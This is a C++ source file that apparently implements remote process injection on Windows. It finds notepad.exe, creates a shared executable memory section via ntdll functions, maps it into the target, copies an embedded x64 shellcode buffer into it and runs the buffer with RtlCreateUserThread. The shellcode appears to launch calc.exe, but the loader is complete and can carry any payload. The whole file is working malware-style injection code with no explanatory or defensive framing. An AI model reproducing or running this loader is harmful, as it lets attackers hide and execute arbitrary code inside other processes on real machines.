#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#pragma comment(lib, "ntdll")

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;

} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(NTAPI* MyNT_CREATE_SECTION)
(_Out_ PHANDLE SectionHandle, _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize, _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes, _In_opt_ HANDLE FileHandle);

typedef NTSTATUS(NTAPI* MyNT_MAP_VIEW_OF_SECTION)
(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize,
    _Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize,
    _In_ DWORD InheritDisposition, _In_ ULONG AllocationType,
    _In_ ULONG Win32Protect);

typedef NTSTATUS(NTAPI* MyRTL_CREATE_USER_THREAD)
(_In_ HANDLE               ProcessHandle,
    _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ BOOLEAN              CreateSuspended,
    _In_ ULONG                StackZeroBits,
    _Inout_ PULONG           StackReserved,
    _Inout_ PULONG           StackCommit,
    _In_ PVOID                StartAddress,
    _In_opt_ PVOID                StartParameter,
    _Out_ PHANDLE             ThreadHandle,
    _Out_ PCLIENT_ID          ClientID);

MyNT_CREATE_SECTION pNtCreateSection = NULL;
MyNT_MAP_VIEW_OF_SECTION pNtMapViewOfSection = NULL;
MyRTL_CREATE_USER_THREAD pRtlCreateUserThread = NULL;

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

int main()
{
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    pNtCreateSection = (MyNT_CREATE_SECTION)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection = (MyNT_MAP_VIEW_OF_SECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pRtlCreateUserThread = (MyRTL_CREATE_USER_THREAD)GetProcAddress(hNtdll, "RtlCreateUserThread");
    if (pNtCreateSection == NULL || pNtMapViewOfSection == NULL || pRtlCreateUserThread == NULL)
    {
        printf("[!] Error getting functions from ntdll\n");
        return 1;
    }
    
    DWORD remotePid = FindProcessId(L"notepad.exe");
    if (!remotePid)
    {
        printf("[!] Error getting pid of target process\n");
        return 1;
    }
    printf("[*] Target proc id: %i\n", remotePid);

    HANDLE hTargetProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_SET_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, remotePid);
    if (!hTargetProc)
    {
        printf("[!] Error getting handle to target process: %d\n", GetLastError());
        return 1;
    }

    // Create Section
    HANDLE sectionHandle = NULL;
    SIZE_T size = 4096;
    LARGE_INTEGER sectionSize = { size };
    if (pNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != 0)
    {
        printf("[!] pNtCreateSection: %d\n", GetLastError());
        return 1;
    }

	// Create Local View 
    PVOID viewBaseAddress = NULL;
    if (pNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &viewBaseAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE) != 0)
    {
        printf("[!] pNtMapViewOfSection: %d\n", GetLastError());
        return 1;
    }

    // Create RemoteView in remote proc
    PVOID remoteViewBaseAddress = NULL;
    if (pNtMapViewOfSection(sectionHandle, hTargetProc, &remoteViewBaseAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ) != 0)
    {
        printf("[!] remote pNtMapViewOfSection: %d\n", GetLastError());
        return 1;
    }

    // Copy Shellcode to Section using the Local View
    memcpy(viewBaseAddress, buf, sizeof(buf));

    // Start remote thread
    HANDLE targetThreadHandle = NULL;
    if (pRtlCreateUserThread(hTargetProc, NULL, FALSE, 0, 0, 0, remoteViewBaseAddress, NULL, &targetThreadHandle, NULL) != 0)
    {
        printf("[!] pRtlCreateUserThread: %d\n", GetLastError());
        return 1;
    }
}